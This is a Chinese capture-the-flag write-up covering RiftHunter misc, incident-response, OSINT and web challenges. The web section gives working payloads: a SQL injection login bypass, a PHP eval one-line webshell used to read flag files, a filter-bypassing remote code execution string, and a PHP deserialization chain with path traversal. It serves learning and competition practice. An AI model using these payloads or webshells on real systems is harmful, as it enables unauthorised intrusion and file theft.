# RiftHunter WP（By uettypi）



## MISC

### Guess！

- 二分询问法秒了。

![image-20251207175058904](https://img.uettypi.top/2026/03/image-20251207175058904.png)

------



## 应急响应

### hacker

1. 由注册可知为HTTP协议，故先筛选HTTP；

2. 随后直接查找字符串register，发现从图示请求开始往后均为重复的注册请求，符合题意，故可得攻击者IP为192.168.37.177。

![image-20251207190230780](https://img.uettypi.top/2026/03/image-20251207190230780.png)

### 奇怪的shell文件

1. 根据经验，先找log，故在附件中寻找；

2. 经寻找，Nginx下无有效log，遂在Apache下找到了有效的log文件`access.log.1708905600`；

3. 在log中，根据神的旨意锁定到图示的这几行，然后通过瞪眼法（其实就是看payload特征）得出webshell工具应为Behinder。

![image-20251207192523130](https://img.uettypi.top/2026/03/image-20251207192523130.png)

- PS：这道题最逆天的点在于flag中竟然是区分大小写的，写behinder是不判对的，实属难绷。

------



## OSINT

### OSINT-1、OSINT-2

- 由于这两题中都有地标性建筑（福州大学图书馆和曼哈顿大桥），故直接谷歌识图秒了。

### OSINT-3

1. 直接Web专业对口，先来一个dirsearch，果然发现了隐藏URL`/info.json`；

   ![image-20251207194427804](https://img.uettypi.top/2026/03/image-20251207194427804.png)

2. 随后，在`/info.json`中，果然发现了Challenge 3的panoID，那接下来找到100%准确的位置当然是手拿把掐了。

   ![image-20251207194446313](https://img.uettypi.top/2026/03/image-20251207194446313.png)

------



## WEB

### b@by n0t1ce b0ard

~~由题可知，flag为ISCTF{CVE-2024-12233}~~

1. 题中给出了CVE编号，于是我们便可以得到：

   ![image-20251207200052850](https://img.uettypi.top/2026/03/image-20251207200052850.png)

   （绷不住了...）
   
2. 然后使用项目中提供的请求模板发送注册请求，注入webshell；

   ![image-20251207200956804](https://img.uettypi.top/2026/03/image-20251207200956804.png)

3. 最后直接GET到flag。

   ![image-20251207201143272](https://img.uettypi.top/2026/03/image-20251207201143272.png)

### flag到底在哪

1. 由题可知，进入`/robots.txt`可获得隐藏URL`/admin/login.php`；

   ![image-20251207201720223](https://img.uettypi.top/2026/03/image-20251207201720223.png)

2. 进入`/admin/login.php`，出现后台登陆界面，先尝试弱口令爆破失败后，判定应为SQL注入，遂进行尝试，最终获得正确payload`username=admin&password=' OR '1'='1`，成功进入了后台界面；

   ![image-20251207203723320](https://img.uettypi.top/2026/03/image-20251207203723320.png)

   ![image-20251207203815284](https://img.uettypi.top/2026/03/image-20251207203815284.png)

3. 上传一句话木马：

   ```php
   <?php eval($_REQUEST["cmd"]);?>
   ```

   然后开始执行命令，初次尝试`cat /flag`发现无回显，故通过`ls /`、`ls /home`等一系列命令确定flag位于`/home`下，遂执行`cat /home/flag`命令，顺利获得flag。

   ![image-20251207203412990](https://img.uettypi.top/2026/03/image-20251207203412990.png)

   ![image-20251207203441257](https://img.uettypi.top/2026/03/image-20251207203441257.png)

### ezrce

- 先分析正则表达式明确其限制，然后开始尝试构造payload，最终获得正确payload`?code=eval(end(current(get_defined_vars())));&cmd=system("cat /flag");`，遂获得flag。

  ![image-20251207204651765](https://img.uettypi.top/2026/03/image-20251207204651765.png)

### 来签个到吧

ISCTF{喵喵喵?}

1. 先分析附件中的`index.php`和`api.php`，明确其逻辑是先从变量`shark`中读取一段序列化利用链存入数据库`notes`表的`content`列，再读取变量`id`，用其去数据库中读取对应的`content`值，并将其反序列化；

2. 明确其逻辑后，便根据`classes.php`中的类内容构造序列化利用链：

   ```php
   <?php 
   class FileLogger {
       public $logfile = "/tmp/notehub.log";
       public $content = "";
   }
   
   class ShitMountant {
       public $url;
       public $logger;
   }
   
   $s = new ShitMountant("./../../../../flag");
   $s->url = "./../../../../flag";
   echo serialize($s);
   ?>
   ```

   最终获得正确payload`O:12:"ShitMountant":2:{s:3:"url";s:18:"./../../../../flag";s:6:"logger";N;}`；

3. 然后先进入`/index.php`，构造POST请求为`shark=blueshark:O:12:"ShitMountant":2:{s:3:"url";s:18:"./../../../../flag";s:6:"logger";N;}`，成功注入数据库；

   ![image-20251207212319875](https://img.uettypi.top/2026/03/image-20251207212319875.png)

4. 最后再进入`/api.php`，构造GET请求为`?id=1`，遂获得flag。

   ![image-20251207213049421](https://img.uettypi.top/2026/03/image-20251207213049421.png)

------



## SIGNIN

这一部分太~~简单~~抽象了，不知道怎么写，所以就不写了。